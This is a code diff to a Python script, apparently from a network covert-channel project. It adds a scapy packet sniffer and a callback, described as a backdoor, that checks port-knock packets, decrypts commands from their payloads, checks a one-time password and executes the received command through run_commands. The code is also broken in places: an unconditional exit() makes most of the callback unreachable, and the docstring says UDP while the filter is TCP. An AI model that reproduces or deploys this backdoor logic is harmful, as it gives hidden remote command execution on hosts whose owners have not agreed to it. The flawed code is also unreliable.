@@ -159,6 +159,8 @@ def start_sender():
     # IPAddr = socket.gethostbyname(hostname)
     # start_new_thread(data_server, (IPAddr, sender_port))
 
+    start_new_thread(start_sniff, ())
+
     keep_going = True
     while keep_going:
         print(f"====================================\n"
@@ -230,6 +232,123 @@ def start_sender():
     except Exception:
         result2 = "Could not drop iptables rule to drop port 80 reset packets."
     print(f"subprocess drop iptables rule result: {result2}")
+
+
+def start_sniff():
+    print("Sniff started.")
+    sniff(prn=process_sniff_pkt, filter=f"host {config.receiver_address} tcp dst port {config.sender_port}",
+          store=0)
+
+
+def process_sniff_pkt(pkt):
+    """
+    Callback function that processes each packet sniffed for valid backdoor sequence.
+    UDP packets must port knock port 1-3 in config file in the right order, while also containing
+    the auth_string as payload specified in config file.
+    If a valid port knock is detected, decrypt command from payload to execute.
+    :param pkt: scapy packet
+    :return: None
+    """
+    global config
+    global packet_list
+    packet_list = {}
+
+    ip_src = pkt.payload.src
+    print(ip_src)
+    if ip_src != config.receiver_address:
+        return
+
+    # dst_port = pkt.payload.payload.dport
+    check_data = bytes(pkt.payload.payload.payload)
+    try:
+        encoded_input = check_data.decode("utf-8")
+    except UnicodeDecodeError:
+        # print("Unauthorized Non-unicode payload for backdoor.")
+        return
+
+    data = check_data.decode("utf-8")
+
+    # if type(check_data) == bytes:
+    #     print(f"Payload: {check_data.decode('utf-8')}")
+    #     data = check_data.decode('utf-8')
+
+    print(f"Data: {data}")
+
+    while True:
+        exit()
+
+    if not data.startswith("POST"):
+        return
+
+    # slice out packet_start
+    s_data = data[4:]
+    decrypt_cmd = ""
+    commands = []
+    try:
+        print(f"Encrypted Cmd: {s_data}")
+        decrypt_cmd = encryption.decrypt(s_data.encode('utf-8')).decode('utf-8')
+        print(f"Cmd: {decrypt_cmd}")
+        commands = decrypt_cmd.split(config.delimiter)
+    except:
+        print(f"Decryption Failed:\n{decrypt_cmd}")
+
+    print(commands)
+    one_time_password = config.port_knock_password_base + config.port_knock_password_seq_num
+    packet_password = commands[0]
+    order = commands[1]
+    print(len(commands))
+    if len(commands) > 2:
+        instruction = commands[2]
+    if len(commands) > 3:
+        instruction_input = commands[3]
+
+    if one_time_password != packet_password:
+        print(f"Password Don't Match!\n{one_time_password}\n{packet_password}")
+        return
+    print(f"Password Matched!\n{one_time_password}\n{packet_password}")
+
+    if order == "1/1":
+        instruction = commands[2]
+        if instruction == "1":
+            print(instruction)
+        elif instruction == "2":
+            print(instruction)
+        elif instruction == "3":
+            instruction_input = commands[3]
+            print(instruction)
+            print(instruction_input)
+            result = run_commands(instruction_input)
+            # encrypted_data = encryption.encrypt(result.encode('utf-8')).decode('utf-8')
+            # send_command_output(encrypted_data, address, sender_port)
+        elif instruction == "4":
+            instruction_input = commands[3]
+            print(instruction)
+            print(instruction_input)
+        elif instruction == "5":
+            instruction_input = commands[3]
+            print(instruction)
+            print(instruction_input)
+        elif instruction == "6":
+            print(instruction)
+        elif instruction == "7":
+            instruction_input = commands[3]
+            print(instruction)
+            print(instruction_input)
+        elif instruction == "8":
+            print(instruction)
+        elif instruction == "9":
+            print(instruction)
+        else:
+            print(f"WARNING, invalid instruction: {instruction}.")
+
+    return
+
+    # Instruction only stored in first packet
+    # If multi-packet, save to packet_list dictionary style 1:data, 2:data
+
+
+
+
 
 
 def send_port_knock(command):
